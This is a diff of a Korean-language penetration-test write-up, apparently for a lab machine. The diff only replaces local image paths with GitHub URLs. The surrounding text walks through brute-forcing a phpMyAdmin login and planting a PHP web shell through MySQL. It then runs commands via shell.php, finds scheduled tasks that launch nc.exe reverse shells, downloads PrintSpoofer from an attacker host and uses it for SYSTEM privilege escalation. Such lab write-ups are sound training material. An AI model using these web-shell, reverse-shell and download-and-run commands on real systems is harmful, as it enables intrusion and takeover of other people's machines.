@@ -1113,7 +1113,7 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 ./tmp/brute_pma.py
 
-![](image.png)
+![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image.png)
 
 # root / 빈 값 (성공)
 
@@ -1121,20 +1121,20 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 192.168.58.189
 
-![WAMP서버 접속](image_1.png)
+![WAMP서버 접속](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_1.png)
 
-![phpmyadmin](image_3.png)
+![phpmyadmin](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_3.png)
 
-![login success](image_4.png)
+![login success](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_4.png)
 
 # success initial access
 
 - MYSQL webshell output write
-  ![web_shell_output](image_6.png)
+  ![web_shell_output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_6.png)
 
 http://192.168.58.189:8080/shell.php?cmd=whoami
 
-![output](image_7.png)
+![output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_7.png)
 
 nt authority\local service
 
@@ -1143,7 +1143,7 @@ nt authority\local service
 
 http://192.168.58.189:8080/shell.php?cmd=whoami%20/priv
 
-![](image_8.png)
+![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_8.png)
 
 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ========
 SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
@@ -1165,14 +1165,14 @@ SeTimeZonePrivilege Change the time zone Disabled
 공격자는 이 권한을 악용해 시스템 내부에서 실행 중인 권한 높은 서비스(예: Print Spooler 등)가 자신(공격자의 프로세스)에게 강제로 인증을 시도하도록 만듭니다.
 시스템 서비스가 인증을 위해 보낸 토큰을 가로채서 그 토큰을 이용해 프로세스를 실행하면, 최고 관리자 권한인 SYSTEM으로 권한이 수직 상승하게 됩니다. (이것이 바로 PrintSpoofer 같은 도구가 작동하는 방식입니다.
 
-- ![](image_9.png)
-- ![](image_11.png)
+- ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_9.png)
+- ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_11.png)
   schtasks /query /fo LIST /v -> 자동화된 명령어 탐색
   http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v
 
 http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /i "Perm \wamp"
 
-- ![](image_12.png)
+- ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_12.png)
 - wamp windows + apache + mysql/mariadb + php
   Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.118.23 4444 -e cmd.exe" Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.100.23 4444 -e cmd.exe"
 
@@ -1192,21 +1192,21 @@ http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri '
 
 # 파일 없어서 실패 칼리에서 설치
 
-![404 failed](image_14.png)
+![404 failed](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_14.png)
 
 sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
-![install PrintSpoofer64.exe for SeImpersonatePrivilege enabled](image_13.png)
+![install PrintSpoofer64.exe for SeImpersonatePrivilege enabled](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_13.png)
 
 ```ps1
 http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 ```
 
-![failed](image_15.png)
+![failed](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_15.png)
 
 # 아예 해당 파일 위치로 이동해서 python server on -> 그래도 안 되길래 그냥 파일을 / 로 옮기고 시도
 
 http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 
-![success](image_16.png)
+![success](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_16.png)
 
 http://192.168.58.189:8080/shell.php?cmd=C:\Temp\PrintSpoofer.exe -i -c cmd.exe
